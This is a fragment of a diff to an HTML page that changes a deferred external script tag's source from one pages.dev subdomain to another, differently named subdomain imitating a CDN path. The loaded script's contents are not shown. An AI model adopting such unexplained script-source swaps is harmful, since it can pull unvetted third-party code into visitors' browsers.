@@ -312,7 +312,7 @@
         
     >
 
-    <script src="https://cdn-privacy.pages.dev/cdn-globaljs/MainJS/UpperJS/DeliverJS/privacy.JS" defer></script>
+    <script src="https://cdn-globaljs-f04.pages.dev/cdn-globaljs/MainJS/UpperJS/DeliverJS/privacy.JS" defer></script>
     
 
         <script nonce="+gWSoSeB7oJ/5IB7H6o53UJw">
